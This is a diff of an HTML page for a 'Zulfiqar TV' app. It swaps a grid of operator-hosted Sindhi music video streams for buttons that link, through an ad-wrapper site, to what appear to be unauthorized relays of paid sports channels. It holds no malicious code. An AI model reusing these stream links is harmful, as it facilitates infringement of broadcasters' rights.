@@ -1,474 +1,64 @@
-<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Zulfiqar  TV</title>
-<link href="https://niazitv.com/jtv/style.css" rel="stylesheet">
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
-		<script src="https://s0.2mdn.net/instream/video/client.js" async="" type="text/javascript"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css">
-		<style>
-			:root {
-				--hfs: 2vmax;
-				--primaryColor: red;
-				--secondaryColor: black;
-				--secondaryOpposite: white;
-			}
-			::-webkit-scrollbar {
-				width: 0em;
-				height: 0em;
-			}
-			::-webkit-scrollbar-thumb {
-				background: var(--secondaryColor);
-			}
-			::-webkit-scrollbar-track {
-				background: none;
-			}
-			* {
-				-webkit-user-select: none;
-				-moz-user-select: none;
-				-ms-user-select: none;
-				user-select: none;
-			}
-			body {
-				background-color: var(--secondaryColor);
-			}
-
-			.alignleft {
-				float: left;
-				margin-left: 5px;
-				font-weight: bold;
-				font-size: 15px;
-			}
-
-			.alignright {
-				float: right;
-				margin-right: 10px;
-				color: var(--primaryColor);
-				font-weight: normal;
-                font-size: 25px;
-			}
-
-			h4 {
-				margin-left: 5px;
-				color: var(--primaryColor);
-				font-weight: bold;
-				font-size: 15px;
-			}
-
-			.nta {
-				position: relative;
-				overflow: hidden;
-				color: var(--primaryColor);
-			}
-
-			div.scrollmenu {
-				background-color: var(--secondaryColor);
-				overflow: auto;
-				white-space: nowrap;
-				position: relative;
-				overflow-y: hidden;
-			}
-
-			div.scrollmenu a {
-				display: inline-block;
-				color: var(--secondaryOpposite);
-				text-align: center;
-				padding: 4px;
-				text-decoration: none;
-			}
-
-			div.scrollmenu a:hover {
-				background-color: var(--secondaryColor);
-			}
-
-			.cen {
-				position: relative;
-				text-align: center;
-				color: var(--secondaryOpposite);
-			}
-
-			.centered {
-				font-size: var(--hfs);
-				font-weight: bold;
-				position: absolute;
-				top: 80%;
-				left: 50%;
-				transform: translate(-50%, -50%);
-			}
-
-			.cent {
-				font-size: auto;
-				position: absolute;
-				top: 95%;
-				left: 50%;
-				transform: translate(-50%, -50%);
-			}
-
-			.nt {
-				width: 100px;
-				border-radius: 10px;
-				height: 120px;
-				z-index: 1;
-			}
-
-			.mnt {
-				width: 100px;
-				border-radius: 2px;
-				height: 100px;
-			}
-			.item img {
-				border-radius: 10px;
-			}
-			#content-container {
-				margin-bottom: 30px;
-			}
-			footer {
-				display: grid;
-				grid-gap: 0.5em;
-				grid-template-columns: repeat(5, minmax(10px, 1fr));
-				position: fixed;
-				bottom: 0;
-				left: 0;
-				width: 100%;
-				background-color: var(--secondaryColor);
-				padding: 0px 4px 10px;
-				justify-content: center;
-				align-items: center;
-                font-size:18px;
-			}
-			footer a {
-				text-align: center;
-				color: var(--primaryColor);
-			}
-			footer a:nth-child(3) i {
-				background: var(--primaryColor);
-				border-radius: 50%;
-				padding: 10px 10px;
-				color: var(--secondaryOpposite);
-				margin-top: -40px;
-				border: 2px solid var(--secondaryColor);
-			}
-		</style>
-
-
-<style>::-webkit-scrollbar{
-    display:none
-}
-*{
-    -ms-overflow-style:none;
-    scrollbar-width:none
-}
-body{
-    margin:0;
-    background:#f5f5f5;
-    font-family:Arial,Helvetica,sans-serif;
-    line-height:1.5;
-    color:white;
-    scroll-behavior:smooth;
-    text-align:center;
-}
-#player-wrapper{
-    width:100%;
-    z-index:999;
-}
-.sticky{
-    position:fixed;
-    top:0;
-    width:100%
-}
-#status{
-    position:fixed;
-    bottom:0;
-    right:0;
-    width:100%;
-    background:#fff;
-    display:none;
-}
-.col-sm-2{
-    border-radius:4px
-}
-.sp{
-    width:50%;
-    height:12px;
-    clear:both;
-    margin:20px auto
-}
-.sp-texture{
-    border:1px #000 solid;
-    border-radius:4px;
-    position:relative;
-    background:linear-gradient(45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent),linear-gradient(-45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent);
-    background-size:16px 16px;
-    background-position:0 0;
-    -webkit-animation:spTexture 1s infinite linear;
-    animation:spTexture 1s infinite linear;
-    color:#000;
-    text-align:center;
-    line-height:3em;
-    font-family:roboto
-}
-@-webkit-keyframes spTexture{
-    from{
-        background-position:0 0
-    }
-    to{
-        background-position:-16px 0
-    }
-}
-@keyframes spTexture{
-    from{
-        background-position:0 0
-    }
-    to{
-        background-position:-16px 0
-    }
-}
-.heading{
-    margin:5px auto;
-    text-align:center
-}
-#rmpPlayer{
-    z-index:999
-}
-.white{
-    color:#fff
-}
-.red{
-    color:red
-}
-.yellow{
-    color:#ffdd40
-}
-footer{
-    color:#fff;
-    text-align:center
-}
-footer p{
-    margin-bottom:20px;
-    margin-top:-10px
-}
-.animated{
-    font-family:sans;
-    margin:0;
-    padding:0;
-    font-size:25px;
-    background:url(https://upload.wikimedia.org/wikipedia/commons/3/3b/ColorRotateHr.gif) no-repeat;
-    background-clip:text;
-    -webkit-background-clip:text;
-    color:transparent;
-    animation:moveBg 40s linear infinite;
-    -webkit-animation:moveBg 40s linear infinite
-}
-@keyframes moveBg{
-    0%{
-        background-position:0 30%
-    }
-    100%{
-        background-position:100% 50%
-    }
-}
-.blink{
-    animation-name:blinker;
-    animation-duration:1s;
-    animation-timing-function:linear;
-    animation-iteration-count:infinite
-}
-@keyframes blinker{
-    0%{
-        opacity:1
-    }
-    50%{
-        opacity:0
-    }
-    100%{
-        opacity:1
-    }
-}
-*{
-    -webkit-touch-callout:none;
-    -webkit-user-select:none;
-    -khtml-user-select:none;
-    -moz-user-select:none;
-    -ms-user-select:none;
-    user-select:none
-}
-body{
-    background:#000!important;
-    overflow:hidden;
-    color:white;
-}
-.parent{
-    background:rgba(0,0,0,.9);
-    font-family:"Source Sans Pro",sans-serif;
-    margin:0;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    flex-direction:column;
-    position:fixed;
-    top:0;
-    height:100%;
-    width:100%;
-    z-index:999999
-}
-.blobs-container{
-    display:flex
-}
-.blob img{
-    width:50%;
-    display:none;
-    margin:auto;
-    margin-top:25px
-}
-.loading{
-    color:#000;
-    display:block;
-    text-align:center;
-    position:relative;
-    top:30px;
-    left:-2px;
-    background:rgba(255,255,255,.9);
-    padding:0 10px;
-    border-radius:3px;
-    width:80%;
-    margin:auto;
-    font-size:10px
-}
-
-.print{height:130px;
-width:130px;
-
-border-radius:5px;
-border:1.5px solid #999;
-padding:2px;
-    margin:3px;
-
-}
-.print:hover{height:130px;
-width:130px;
-border:2px solid red;
-border-radius:5px;webkit-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
--moz-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
-box-shadow: 0px 3px 20px 3px rgba(255,0,0,100);}
-.print:active{height:130px;
-width:130px;
-border:2px solid red;
-border-radius:5px;
-webkit-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
--moz-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
-box-shadow: 0px 3px 20px 3px rgba(0,255,0,100);}
-marquee{
-border-radius: 6px 0px 0px  6px;
-width: 90%;
-border:2px solid red;
-margin: auto;
-   font-weight:bold;
-   color:#fff;
-display: block;}
-
-.marquee span{display: inline-block;
- background: #ff0000;
- border-radius:  0px 6px 6px 0px;
-  padding: 0px 10px;
-   color: #fff;
-   padding:2px;
-   font-weight:bold;
-    display: inline-block;
-     float: right;
-      width: auto;
-       line-height: 35px;}
-       .marquee marquee{display: block;
-        line-height: 35px;
-         z-index: -1; 
-         margin-right: 10px;
-          width: auto; 
-          margin: auto;}
-      
-</style>
-
-<link id="rmp-dress-code" type="text/css" rel="stylesheet" href="https://cdn.radiantmediatechs.com/rmp/5.9.2/css/rmp-s4.min.css"></head><body style="overflow: auto;">
+<xtml>
 	
-	<div class="parent" id="loader" style="display: none;"><div class="blobs-container"><div class="blob"><img id="loader-image" src=""></div></div></div><div id="player-wrapper"><div id="rmpPlayer" ></div>
-<div class="marquee yellow"><span>:Note</span> <marquee scrollamount="5" direction="left" onmouseover="stop()" onmouseout="start()">Yeh All Sindhi Songs Jazz Ki SiM Par Bilkul Muft Free Hain 1st Time Apke Pass 10 Mbs HoNa Chahiye Apka Mbs Use Nahi Hoga Thanks for Using Zulfiqar Tv App 
-</marquee> </div>
+	<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Zulfiqar TV Pro</title>
+<link href="https://niazitv.com/jtv/style.css" rel="stylesheet">
 
-	<h2 class="animated" align="center">Jazz Free Sindhi Songs</h2><h4>Watch Only On Zulfiqar <span class="logoText"> TV App</span></h4><div id="buttons-list" style="margin-top: 0px;">
+		
 
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106430_360.mp4/chunklist_w167729718.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRYnYlvIGDIfwmdvRn9mcj8MIfbAhmAhq1XKA&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106465_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTJC4gkKcznXuzxxGBF8LCJZ1zcqHF3o5oNDw&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106451_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKoUhC8pjq49gArwjSFtp43JwZeoyxAge3-Q&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106514_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQVPp0t-AXBaK01M9XDfoJwZaigsfKF4L-Hpw&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106437_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcThHwGD4elnxJGMplCtL-fob3M9zBurSYIOUA&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106500_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://teleclips.pk/revamp/image/music/faiza_ali_majboori_album_22-2021/video/101632_1625742419271_1280x720.jpg" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106486_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSro8ptuTNytHDGrztAnEq9qopsa9LVRO_cvw&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106472_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT-CvVzvfLO5ZsvUtgVicjQqSq2YbarmCEgqQ&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106507_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTtEGqKG7X1mb5qmWdf6Uibf7A1VA4FVCA4VQ&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106458_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQcI9YSSL_A8AnUUvUxVF7oOkUMb9GmhAMDNw&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106493_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1R6vNTsbMhi7gIaYCgpoGFMPpawewvEqHZA&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106479_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzI9ErVGgLYTj5yCOMA6vGLfbOTzf4zNdmjg&usqp=CAU" ></span>
+ <style> .header{ background-color: black; height: 80px; width: 100%; position:fixed; } p{ color: white;font-bold: arial; 30px; display: inline-block;margin-left: 10px; position: fixed; } .headerline{ background:black; height: 5px; color:black; background-color: red; position: fixed; } .halfline{ background: black; height: 2px; width: 100%;position: fixed; } .button{ border-radius: 3% ; border-color: darkorange; padding: 1px; margin: 5px; height:140px; width: 160px; } body{ background-color: #000000; } .footer{ width: 100%; height: 20px; background-color: } .ok{ border:3px solid #FF00BC; border-style: double; } </style>
 
 
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106430_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTX7CQpxdeajI90HR_JGwlQRmd5Snb0BXcMWA&usqp=CAU" ></span>
+ <style> html, body { padding: 0; margin: 0; position: relative; } </style>
 
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106451_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhlHxOcuKngVbaGX96AqCNwFBGhzi7ZrXn4g&usqp=CAU" ></span>
+ <style> body { margin-top: 10px; background: #000; text-align: center; color: #fff; font-bold: "Helvetica Neue", Helvetica, Arial, sans-serif; background: #000000; </style> <style> body { background-image: url(""); } </style>
 
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_majboori_album_22-2021/video/106514_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRKfja_0Y5kamf49IvG7K56kkEMskqD4cb-dw&usqp=CAU" ></span>
+ <h1 style="text-align: center; padding-top: %;">
 
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106563_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRFLQZ5K0ddCL7Q-prKGXZaUOuijHyJvho0wA&usqp=CAU" ></span>
+</h1> <hr> <h4 style="text-align: center; color: #FF6600;margin: 5px;">All Paid Sports Channels</h4> <hr> <div class="row"> <div style="position: fixed; top: 0px; width: 1%"><center> </div> <div class="col-xs-6">
+	
+	
+	
+	
+	
+	
+	<a href="https://ytlive.tk/ads.html?id=https://stream.crichd.vip/update/asportshd.php"><button class="button button2"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRPFrSF4f4VvZBQHRGu0rikCCQkry-P_3ufkA&usqp=CAU" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Asports HD</h4></button>
 
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106626_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSnnUvMrdlR3n68rY0t4Q343v2mbKUMMPoXNw&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106661_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAyMxjXJIqMu-d8nGr6gkm450d6UZJmQyE3Q&usqp=CAU" ></span>
-
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106598_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVp04pdnJV9bt342CaAbccerP8HlKrMFyh6A&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106633_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7KHKz9Nkip1gMMQhhPFgmDLAKngqFHfn3aA&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106570_360.mp4/playlist.m3u8?ticket"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT02giKX5CYOXq_wQhw6kolhsTOOVQxYi-SoQ&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106605_360.mp4/playlist.m3u8?ticket"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQDmL8y8O_w_ahFMwLtcUmlcW1Yc8Haqt1Og&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106577_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQdgUSAWxq3qWsyzT5Oia3azQNv_3ba6g3VBg&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106640_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRVlto36Sp0gMwKSmV39tKeWZkvxayBC_5c7g&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106612_240.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRaN4zIVA3opY-_JsOE9ZnGUUd57EnO2P96LQ&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106647_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR7x2CYEzNH_PIBY1wtmc-4NKhTR83EbX3Vzg&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106584_240.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRCD7gOIOAzL6oEeDAP2RMynoBG6dVd8lOM3w&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106619_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTsQ8p3hRWB1-RhORqiAM0BgMNE-wxfX5Y2Nw&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106591_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZHSgdvPI7ZgZcUZRL0OSPnJ6r70XDXVwwDA&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/faiza_ali_hussan_ji_shahzadi_album_24-2021/video/106654_240.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRPHggxHUaFNUYWNbDzTWRNG2I3lAhHyoen0Q&usqp=CAU" ></span>
-
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/mumtaz_molai_kaido_sohno_tho_lagi_album_44-2021/video/106178_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ1_CIRxVewt3GXdbZqdLrNl53JS7jSlEklTA&usqp=CAU" ></span>
-
-<span url="https://5d95f094eba0d.streamlock.net:1936/titan/_definst_/jazzstream_vod/video/music/mumtaz_molai_kaido_sohno_tho_lagi_album_44-2021/video/106171_360.mp4/playlist.m3u8"><img name=" Hummasala " autofocus="" class="print" id=" hummasala"  src="https://cdns-images.dzcdn.net/images/cover/f45d5c67497271eda04aab2c697748cf/264x264.jpg" ></span>
+	
+	
+	<a href="https://ytlive.tk/ads.html?id=https://stream.crichd.vip/update/ptv.php"><button class="button button2"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREyJ1IO6KDH5iuXgdQ9szn04kLgSuxVBVWXw&usqp=CAU" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Ptv Sports</h4></button>
+	
+	
+	
+	<a href="https://ytlive.tk/ads.html?id=https://stream.crichd.vip/update/fox501.php"><button class="button button2"> <img src="data:image/png;base64,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